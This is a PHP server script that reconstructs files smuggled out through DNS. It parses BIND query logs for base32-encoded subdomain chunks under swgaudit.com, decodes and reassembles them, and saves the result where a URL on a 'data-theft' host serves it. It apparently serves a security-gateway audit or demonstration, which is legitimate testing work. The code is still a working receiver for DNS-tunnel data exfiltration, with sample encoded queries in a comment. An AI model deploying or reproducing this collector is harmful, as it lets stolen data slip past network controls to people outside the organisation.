<?php
header('Content-Type: application/json');

$applog = 'app.log';
$logger = fopen($applog, 'a');

function logMessage($message) {
    global $logger;
    $timestamp = date('Y-m-d H:i:s');
    fwrite($logger, $timestamp . ' - ' . $message . "\n");
}

$uploadsDir = __DIR__ . '/uploads';
if (!file_exists($uploadsDir)) {
    mkdir($uploadsDir, 0755, true);
    logMessage("Created uploads directory: $uploadsDir");
}

try {
    if (!isset($_GET['id'])) {
        throw new Exception('Missing ID parameter');
    }

    $id = preg_quote($_GET['id'], '/');
    logMessage("Processing request for ID: $id");
    $logFile = '/var/log/named/query.log';
    /*
        02-Apr-2025 13:18:54.098 queries: info: client @0x7727801e64c0 192.221.150.128#18639 (2uGiBvGyxDKiBThaXDomBQgaYDCiBvGUXdOMBqgAYdCibthexdkiBVgqXDKI.BtheXDktbAGq3S4njagm4s4NKdEA2dmLrSHE4TSoJZEAZtslRVEa2dklrVEa.ZTQlrxGAYdambREA2dklrvEaZtOLRVjqqdInJOGUqdGMBOgVbSaNBvfY2sAm.RZfyZDSoJzhe4SaNbWfyZDsoJZHe4saMRYfY2SaNB.SWgaUDIT.cOm): query: 2uGiBvGyxDKiBThaXDomBQgaYDCiBvGUXdOMBqgAYdCibthexdkiBVgqXDKI.BtheXDktbAGq3S4njagm4s4NKdEA2dmLrSHE4TSoJZEAZtslRVEa2dklrVEa.ZTQlrxGAYdambREA2dklrvEaZtOLRVjqqdInJOGUqdGMBOgVbSaNBvfY2sAm.RZfyZDSoJzhe4SaNbWfyZDsoJZHe4saMRYfY2SaNB.SWgaUDIT.cOm IN A -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.107 queries: info: client @0x59f1f7ebc390 192.221.151.4#14658 (NLyDPXbIvMJ.259.uD2iRueI7dYZZ6hRYgC5DieBSD2isnEaYtamJogUqdCMcdea4dmlRWEazdol.Ruea3taIbuGmXDGIbVgMqdKobOGZBSAmZXfy4sANzsFyySaMRtFy2sAoBWfY.2saMjQEaYTaMJoGvBsamrvFYZsAoJZFY3cAnBQFY4saMJqGaxdCiBvGYxdGI.bRgAyS4nKDeA2TolRREaytcNJOhEQdknbOgmQDcmZ.sWGAudit.com): query: NLyDPXbIvMJ.259.uD2iRueI7dYZZ6hRYgC5DieBSD2isnEaYtamJogUqdCMcdea4dmlRWEazdol.Ruea3taIbuGmXDGIbVgMqdKobOGZBSAmZXfy4sANzsFyySaMRtFy2sAoBWfY.2saMjQEaYTaMJoGvBsamrvFYZsAoJZFY3cAnBQFY4saMJqGaxdCiBvGYxdGI.bRgAyS4nKDeA2TolRREaytcNJOhEQdknbOgmQDcmZ.sWGAudit.com IN A -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.108 queries: info: client @0x59f1f7ebf590 192.221.150.7#13792 (ibSgMXdOmJuGi4doIbsg4xdcNbsHA2tOQZAgIZs4NzrgqzDQNZAgi3s4mJuG.I4DKnZagIzs4NzrgqZdQnzAGIZS4nZRGqzdqNzagi3S4Mjugi4DkNzagizs4.NzRgqzdQNzcHy6C64dbOruD4pbPM47dyl3hhy6c6Z.swGaUdIT.cOm): query: ibSgMXdOmJuGi4doIbsg4xdcNbsHA2tOQZAgIZs4NzrgqzDQNZAgi3s4mJuG.I4DKnZagIzs4NzrgqZdQnzAGIZS4nZRGqzdqNzagi3S4Mjugi4DkNzagizs4.NzRgqzdQNzcHy6C64dbOruD4pbPM47dyl3hhy6c6Z.swGaUdIT.cOm IN A -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.136 queries: info: client @0x7727801e96c0 192.221.151.4#20527 (nLydpXBiVMJ.225.GMxdaoBVhA3dSIbRGAYs4njugi4uYibrgAYS4njUgi4tmoJAGEYFUIR6HqxX.AYlUNa7dyL3hHy6c6Zz6HrTsa2lEHuRDGLtHFUZV6ztSL4YWQzDUN5ShU5dS.gr3wkZRNon2hE33lmuRCAZtjNrWD2iToN5xgKIraOn2hE33LMuWwy2lomVRW.C4b5EJZg65LOMQRCA43uoJXwwzjNNrUw4Zlkn5Uw4.SWGauDIt.cOM): query: nLydpXBiVMJ.225.GMxdaoBVhA3dSIbRGAYs4njugi4uYibrgAYS4njUgi4tmoJAGEYFUIR6HqxX.AYlUNa7dyL3hHy6c6Zz6HrTsa2lEHuRDGLtHFUZV6ztSL4YWQzDUN5ShU5dS.gr3wkZRNon2hE33lmuRCAZtjNrWD2iToN5xgKIraOn2hE33LMuWwy2lomVRW.C4b5EJZg65LOMQRCA43uoJXwwzjNNrUw4Zlkn5Uw4.SWGauDIt.cOM IN AAAA -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.232 queries: info: client @0x59f1f7ec2790 192.221.151.8#17449 (nlYDPXbIvMJ.263.JqgexDKnBsheQdcmc2EI7DYl3Qmf2GQPR4F5Tt4PbPm47dyzzaNfsD2irRfZ.Ts2Mk7Mzzf6MLvoFVdi6DkorzDI532oiWXG5DSN5VWkiRamZuWy3b5EjxG63.TfeiQhg5dsn5VWkllMNFxgKy3bOa6se4TpOVxgIIRaON2hE33lMuWwY2LOmV.vg62lOHurhE33VNzSceIdTOrZG623ffVWwS5DfOJw.SWgAUDIT.CoM): query: nlYDPXbIvMJ.263.JqgexDKnBsheQdcmc2EI7DYl3Qmf2GQPR4F5Tt4PbPm47dyzzaNfsD2irRfZ.Ts2Mk7Mzzf6MLvoFVdi6DkorzDI532oiWXG5DSN5VWkiRamZuWy3b5EjxG63.TfeiQhg5dsn5VWkllMNFxgKy3bOa6se4TpOVxgIIRaON2hE33lMuWwY2LOmV.vg62lOHurhE33VNzSceIdTOrZG623ffVWwS5DfOJw.SWgAUDIT.CoM IN HTTPS -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.303 queries: info: client @0x59f1f7ec5990 192.221.150.135#23429 (339.2UGibvGYxDkibThaxdOmBQGayDCIBVgUxDombQGAyDcibThEXdKiBVgQxdkI.btHEXdKtBAgQ3s4NJAGm4S4NkdEA2DMlRShE4tsoJZeAZtSLRVeA2dKlRvEa.ztqLrXGaYDAMbReA2DKLrVeAZToLRvjqQDInjoGUqDGMbogVBSanBvfY2sAM.rzFyZDSoJZHE4SanBwFYZdSOJzHe4SaMRyfy2saNB.sWGAUdit.COm): query: 339.2UGibvGYxDkibThaxdOmBQGayDCIBVgUxDombQGAyDcibThEXdKiBVgQxdkI.btHEXdKtBAgQ3s4NJAGm4S4NkdEA2DMlRShE4tsoJZeAZtSLRVeA2dKlRvEa.ztqLrXGaYDAMbReA2DKLrVeAZToLRvjqQDInjoGUqDGMbogVBSanBvfY2sAM.rzFyZDSoJZHE4SanBwFYZdSOJzHe4SaMRyfy2saNB.sWGAUdit.COm IN A -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.373 queries: info: client @0x7727801ec8c0 192.221.150.14#36881 (y3tCnBShA3SanBUfYzDqnjxgEzSAMRTfY3TcnbSHa3sanBQFY4dknzRGQzuY.IbSgMxdoMjugI4dOibSG4xDcNBShA2ToqzagizS4nzRgqZDqNzaGI3S4mjuG.i4dKnZaGIzS4nZrgQzdQNzAGiZs4nzrGQzdqnzagI3s4mjugI4dKnzaGIZS4.NZrGQzdqNZchY6C64DBOrUd4pBpm47DYL3hhy6C6Z.sWgAuDIt.COM): query: y3tCnBShA3SanBUfYzDqnjxgEzSAMRTfY3TcnbSHa3sanBQFY4dknzRGQzuY.IbSgMxdoMjugI4dOibSG4xDcNBShA2ToqzagizS4nzRgqZDqNzaGI3S4mjuG.i4dKnZaGIzS4nZrgQzdQNzAGiZs4nzrGQzdqnzagI3s4mjugI4dKnzaGIZS4.NZrGQzdqNZchY6C64DBOrUd4pBpm47DYL3hhy6C6Z.sWgAuDIt.COM IN A -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.376 queries: info: client @0x59f1f7ec8b90 192.221.151.7#28150 (nLYdPxBIvMj.259.uD2iRuEI7dyzz6HRygc5dIEBSd2isNEAytaMJOGuQDcMCDea4DmlrWEAzDoL.RuEA3taIBuGmXDgibVGMQdKobOGZbsAMzxfY4sANZsFYYsAmrTFy2SaobWFy.2sAMJqeAYtaMJogVBsAmrVFyzsAojZfY3CaNBqFy4SAmjQGAxDCIbVgyXdgi.BrGAYs4NKDea2tolrREAYtcNjOheqdknbOGMQDcMz.SWGaUdIT.COM): query: nLYdPxBIvMj.259.uD2iRuEI7dyzz6HRygc5dIEBSd2isNEAytaMJOGuQDcMCDea4DmlrWEAzDoL.RuEA3taIBuGmXDgibVGMQdKobOGZbsAMzxfY4sANZsFYYsAmrTFy2SaobWFy.2sAMJqeAYtaMJogVBsAmrVFyzsAojZfY3CaNBqFy4SAmjQGAxDCIbVgyXdgi.BrGAYs4NKDea2tolrREAYtcNjOheqdknbOGMQDcMz.SWGaUdIT.COM IN HTTPS -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.534 queries: info: client @0x59f1f7ecbd90 192.221.150.138#9122 (nlYdpXBIVMJ.339.2ugIBvGyXdkIbTHaXDomBqgaYDCIBvgUxdoMBQgAyDciBtHeXDKIbVgqXdKi.BthEXDKtbAGQ3S4nJAGM4s4nkdea2DmlRShe4TSojZeazTSLRvEa2dklrvEA.ZtqlRxgaYDamBREA2dkLrVeAZTOlRVjQQdInjOGuQDgmBogVbsaNBVfY2sAm.rZFyZdSoJzHe4SaNbwfYZdsojzHe4sAmrYfY2sANb.SWgaudiT.Com): query: nlYdpXBIVMJ.339.2ugIBvGyXdkIbTHaXDomBqgaYDCIBvgUxdoMBQgAyDciBtHeXDKIbVgqXdKi.BthEXDKtbAGQ3S4nJAGM4s4nkdea2DmlRShe4TSojZeazTSLRvEa2dklrvEA.ZtqlRxgaYDamBREA2dkLrVeAZTOlRVjQQdInjOGuQDgmBogVbsaNBVfY2sAm.rZFyZdSoJzHe4SaNbwfYZdsojzHe4sAmrYfY2sANb.SWgaudiT.Com IN A -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.682 queries: info: client @0x59f1f7ecef90 192.221.150.0#17470 (302.y3TcNBSHA3sANBUFyzDQNJxGEZSAmrTfy3TCNBSha3SAnBqFY4dknZrGQZuY.iBsGMxDOmjUgI4DOibsG4xDcnBSHa2ToQzAGIzs4NzrgqZdQNZaGi3S4Mjug.I4dkNzAGizs4nZRgQZDQNZAGizs4NZRGQZdqNzAGi3S4mjugI4DKnzagiZS4.NzrgQZDqNzcHY6C64dbORUd4pbPm47dYl3HhY6C6z.SwgAuDIT.COM): query: 302.y3TcNBSHA3sANBUFyzDQNJxGEZSAmrTfy3TCNBSha3SAnBqFY4dknZrGQZuY.iBsGMxDOmjUgI4DOibsG4xDcnBSHa2ToQzAGIzs4NzrgqZdQNZaGi3S4Mjug.I4dkNzAGizs4nZRgQZDQNZAGizs4NZRGQZdqNzAGi3S4mjugI4DKnzagiZS4.NzrgQZDqNzcHY6C64dbORUd4pbPm47dYl3HhY6C6z.SwgAuDIT.COM IN A -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.766 queries: info: client @0x59f1f7ed2190 192.221.150.138#19783 (nlydpXBIvMj.339.2uGIbVGyxdKiBThaxDoMbqGAYDCIbvGUXDomBQgAYdcIBThEXDkiBVgqxDKI.btHexdktBAgQ3S4njAGm4s4NkdeA2DMlrsHE4TsojzEazTsLrVea2dKlRvEA.ztQLRxGAYdaMBreA2DKLRVEaztOlRVjQqDinJoguQDGMBOGVbSANbVFY2SAm.rZFyZDsoJZhe4SAnBwFyzDSoJzhe4sAmRYfy2sAnB.swGAudit.coM): query: nlydpXBIvMj.339.2uGIbVGyxdKiBThaxDoMbqGAYDCIbvGUXDomBQgAYdcIBThEXDkiBVgqxDKI.btHexdktBAgQ3S4njAGm4s4NkdeA2DMlrsHE4TsojzEazTsLrVea2dKlRvEA.ztQLRxGAYdaMBreA2DKLRVEaztOlRVjQqDinJoguQDGMBOGVbSANbVFY2SAm.rZFyZDsoJZhe4SAnBwFyzDSoJzhe4sAmRYfy2sAnB.swGAudit.coM IN AAAA -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:54.956 queries: info: client @0x7727801efac0 192.221.150.10#26862 (NlyDPXbiVMJ.302.y3TCNbsha3SANBuFyzDqNJxgEzSAMRtfY3tcnbSHA3SanbqFY4DkNzrgqzUy.IBsGmxdoMJugi4DOibSG4xDCNbSHA2TOQzAGizS4NzrGQZDqnZagI3S4mJug.I4dKnzAGIZS4nzRGQzdqnzagiZS4nZrgQZDQnzAgI3S4MJugi4DKNZaGizs4.NZRgqZdQNZCHY6C64dBOrUD4pBpm47DYl3Hhy6C6Z.SWGauDIT.coM): query: NlyDPXbiVMJ.302.y3TCNbsha3SANBuFyzDqNJxgEzSAMRtfY3tcnbSHA3SanbqFY4DkNzrgqzUy.IBsGmxdoMJugi4DOibSG4xDCNbSHA2TOQzAGizS4NzrGQZDqnZagI3S4mJug.I4dKnzAGIZS4nzRGQzdqnzagiZS4nZrgQZDQnzAgI3S4MJugi4DKNZaGizs4.NZRgqZdQNZCHY6C64dBOrUD4pBpm47DYl3Hhy6C6Z.SWGauDIT.coM IN A -E(0)DC (139.59.64.233)
        02-Apr-2025 13:18:55.241 queries: info: client @0x7727801f2cc0 192.221.150.6#10963 (nLYdpXbIvmj.302.y3TcnbSha3sanBuFYzdqNjXgeZsamRTFY3tCNbsHa3sanbqfy4dkNzRgQZuy.IbsGMxdoMJUgi4DoibSG4XDCnbsHa2TOQZAgizS4nZrgQzDqNZAGI3s4mJuG.I4DkNzAgiZS4nzrGqzDQNZAgIzs4nzRGqzdQNzagI3s4MJUGi4DKNzagIZS4.nZrGqZDQnZcHy6C64dbOruD4Pbpm47dyl3hhY6C6z.SwGAudiT.coM): query: nLYdpXbIvmj.302.y3TcnbSha3sanBuFYzdqNjXgeZsamRTFY3tCNbsHa3sanbqfy4dkNzRgQZuy.IbsGMxdoMJUgi4DoibSG4XDCnbsHa2TOQZAgizS4nZrgQzDqNZAGI3s4mJuG.I4DkNzAgiZS4nzrGqzDQNZAgIzs4nzRGqzdQNzagI3s4MJUGi4DKNzagIZS4.nZrGqZDQnZcHy6C64dbOruD4Pbpm47dyl3hhY6C6z.SwGAudiT.coM IN HTTPS -E(0)DC (139.59.64.233)
    */

    $log = file_get_contents($logFile);
    
    // Get entries from last 10 minutes
    $tenMinutesAgo = strtotime('-10 minutes');
    $recentLog = '';
    $lines = file($logFile);
    
    foreach ($lines as $line) {
        // Parse log timestamp - assumes format like "DD-Mon-YYYY HH:MM:SS.mmm"
        $logDate = strtotime(substr($line, 0, 20));
        if ($logDate >= $tenMinutesAgo) {
            $recentLog .= $line;
        }
    }
    
    if (!$recentLog) {
        echo json_encode(['success' => false, 'message' => 'No recent DNS queries found']);
        exit;
    }

    // Updated regex to match multiple data chunks
    preg_match_all('/queries: info: client @[^\s]+ [^#]+#\d+ \(' . $id . '\.(\d+)\.([a-z0-9\.]+)\.swgaudit\.com\): query: ' . $id . '\.\1\.\2\.swgaudit\.com IN [A]\s*-/i', $recentLog, $matches);

    logMessage("Found " . count($matches[1]) . " DNS query matches");
    
    // Create array of chunks with chunk numbers as keys to handle duplicates
    $tempChunks = array();
    for ($i = 0; $i < count($matches[1]); $i++) {
        $chunkNo = (int)$matches[1][$i];
        if (!isset($tempChunks[$chunkNo])) {
            $tempChunks[$chunkNo] = strtolower(str_replace('.', '', $matches[2][$i]));
            // logMessage("Processing chunk " . $chunkNo);
        } else {
            // logMessage("Discarding duplicate chunk " . $chunkNo);
        }
    }

    // Convert to final chunks array format
    $chunks = array();
    foreach ($tempChunks as $number => $data) {
        $chunks[] = array(
            'number' => $number,
            'data' => $data
        );
    }
    logMessage("Created " . count($chunks) . " unique data chunks");

    // First chunk (0) contains metadata
    $metadata = null;
    foreach ($chunks as $chunk) {
        if ($chunk['number'] === 0) {
            try {
                logMessage("Processing metadata chunk: " . json_encode($chunk, true));
                $metadataBase32 = $chunk['data'];
                $metadataStr = base32_decode($metadataBase32);
                logMessage("Decoded metadata string: " . $metadataStr);
                $metadata = json_decode($metadataStr, true);
                if (json_last_error() !== JSON_ERROR_NONE) {
                    throw new Exception('JSON decode failed: ' . json_last_error_msg());
                }
                logMessage("Successfully parsed metadata: " . json_encode($metadata, true));
                break;
            } catch (Exception $e) {
                logMessage("Failed to process metadata: " . $e->getMessage());
                throw new Exception('Failed to process metadata: ' . $e->getMessage());
            }
        }
    }

    if (!$metadata || !isset($metadata['name'])) {
        logMessage("Invalid metadata. Chunks found: " . json_encode($chunks, true));
        throw new Exception('Invalid or missing metadata in chunks');
    }

    // Filter out metadata chunk and sort remaining chunks
    $dataChunks = array_filter($chunks, function($chunk) {
        return $chunk['number'] !== 0;
    });
    
    usort($dataChunks, function($a, $b) {
        return $a['number'] - $b['number'];
    });
    logMessage("Sorted " . count($dataChunks) . " data chunks");

    // Extract and combine data chunks
    $orderedData = array_map(function($chunk) {
        return $chunk['data'];
    }, $dataChunks);

    $combinedData = implode('', $orderedData);
    logMessage("Combined data length: " . strlen($combinedData));
    
    // Decode the base32 data
    $fileData = base32_decode($combinedData);
    
    // Generate safe filename
    $filename = preg_replace('/[^a-zA-Z0-9_.-]/', '_', $metadata['name']);
    $filepath = $uploadsDir . '/' . uniqid() . '_' . $filename;
    
    // Save the file
    if (file_put_contents($filepath, $fileData) === false) {
        logMessage("Failed to save file to: $filepath");
        throw new Exception('Failed to save file');
    }
    logMessage("Successfully saved file to: $filepath");
    
    // Generate public URL with full domain
    $fileUrl = 'https://data-theft.swgaudit.com/uploads/' . basename($filepath);
    logMessage("Generated public URL: $fileUrl");

    echo json_encode([
        'success' => true,
        'message' => 'File reconstructed successfully',
        'fileUrl' => $fileUrl,
        'filename' => $metadata['name'],
        'type' => $metadata['type']
    ]);

} catch (Exception $e) {
    logMessage("Error: " . $e->getMessage(), isset($idLogger) ? $idLogger : null);
    echo json_encode([
        'success' => false,
        'message' => 'Error processing data: ' . $e->getMessage()
    ]);
} finally {
    fclose($logger);
    if (isset($idLogger)) {
        fclose($idLogger);
    }
}

function base32_decode($input) {
    $input = strtoupper($input);
    $output = '';
    $v = 0;
    $vbits = 0;
    
    for ($i = 0; $i < strlen($input); $i++) {
        $v = ($v << 5) | strpos('ABCDEFGHIJKLMNOPQRSTUVWXYZ234567', $input[$i]);
        $vbits += 5;
        while ($vbits >= 8) {
            $output .= chr(($v >> ($vbits - 8)) & 255);
            $vbits -= 8;
        }
    }
    return $output;
}
?>